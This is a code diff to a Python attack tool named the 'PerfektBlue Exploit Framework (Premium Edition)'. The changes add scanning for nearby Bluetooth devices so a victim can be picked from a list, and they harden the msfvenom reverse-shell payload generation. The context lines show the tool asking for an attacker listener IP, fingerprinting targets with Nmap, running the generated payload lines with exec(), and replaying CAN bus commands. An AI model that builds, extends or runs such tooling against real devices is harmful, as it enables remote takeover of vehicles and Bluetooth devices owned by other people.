@@ -35,6 +35,25 @@ def prompt_external_ip():
     ip = input("Enter attacker IP for reverse shell listener (or press ENTER to auto-detect): ").strip()
     return ip if ip else get_local_ip()
 
+def discover_bluetooth_devices():
+    print("[*] Searching for nearby Bluetooth devices...")
+    nearby_devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True, lookup_class=False)
+    if not nearby_devices:
+        print("[!] No Bluetooth devices found.")
+        return None
+    print("[+] Found devices:")
+    for i, (addr, name) in enumerate(nearby_devices):
+        print(f"  [{i}] {name} ({addr})")
+    while True:
+        try:
+            choice = input("Select a device by number: ").strip()
+            if choice.isdigit() and 0 <= int(choice) < len(nearby_devices):
+                return nearby_devices[int(choice)][0]
+            else:
+                print("[!] Invalid choice. Please enter a valid number.")
+        except Exception as e:
+            print(f"[!] Error selecting device: {e}")
+
 def run_nmap_fingerprint(target_ip):
     print(f"[*] Running Nmap OS and service scan on {target_ip}...")
     try:
@@ -90,7 +109,7 @@ def generate_reverse_shell_payload(ip, port, arch):
             f"LHOST={ip}",
             f"LPORT={port}",
             "-f", "python"
-        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=300)
         if result.returncode != 0:
             print(f"[!] msfvenom failed: {result.stderr}")
             return b""
@@ -100,6 +119,9 @@ def generate_reverse_shell_payload(ip, port, arch):
         for line in payload_lines:
             exec(line.strip())
         return buf
+    except subprocess.TimeoutExpired:
+        print("[!] msfvenom command timed out after 300 seconds. It might be taking too long to generate the payload.")
+        return b""
     except Exception as e:
         print(f"[!] Payload generation error: {e}")
         return b""
@@ -197,7 +219,10 @@ def replay_can_command(interface='can0', cmd_map=None):
 # === MAIN ===
 def main():
     print("=== PerfektBlue Exploit Framework (Premium Edition) ===")
-    target = input("Target Bluetooth MAC address: ").strip()
+    target = discover_bluetooth_devices()
+    if not target:
+        print("[!] No target selected. Exiting.")
+        return
     port = DEFAULT_RFCOMM_PORT
     attacker_ip = prompt_external_ip()
 
